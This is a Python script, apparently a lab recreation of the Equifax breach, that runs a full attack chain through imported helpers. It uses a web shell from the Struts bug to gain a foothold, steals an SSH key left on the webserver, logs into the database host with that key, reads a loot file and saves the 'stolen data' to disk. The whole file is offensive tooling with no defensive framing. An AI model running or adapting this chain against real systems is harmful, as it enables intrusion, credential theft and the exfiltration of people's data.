import datetime
import pathlib

from config import Target
from findinfo import find_ssh_key
from runners import WebShell, SshRunner


def main():
    target = Target()
    print("[*] Equifax attack chain starting\n")

    # --- Step 1: foothold on the webserver via the Struts bug ---
    web = WebShell()
    who = web.run("whoami")
    print(f"[+] Step 1  foothold on webserver as: {who}")

    # --- Step 2: find the SSH key left on the webserver ---
    cred = find_ssh_key(web)
    print(f"[+] Step 2  stole SSH key for {cred.user}@{cred.host}")

    # --- Step 3: lateral move to the database with the stolen key ---
    db = SshRunner(cred.host, cred.user, cred.private_key)
    db_user = db.run("whoami")
    print(f"[+] Step 3  logged into database as: {db_user}")

    # --- Step 4: exfiltrate the data ---
    loot = db.run(f"cat {target.loot_path}")
    print(f"[+] Step 4  exfiltrated {len(loot)} bytes from {target.loot_path}")

    # --- Save the stolen data to a timestamped folder ---
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    out_dir = pathlib.Path(__file__).parent / "output" / stamp
    out_dir.mkdir(parents=True, exist_ok=True)
    loot_file = out_dir / "data.json"
    loot_file.write_text(loot)

    print(f"\n[*] Attack complete. Stolen data saved to:\n    {loot_file}")
    print("\n--- preview (first 200 chars) ---")
    print(loot[:200])


if __name__ == "__main__":
    main()
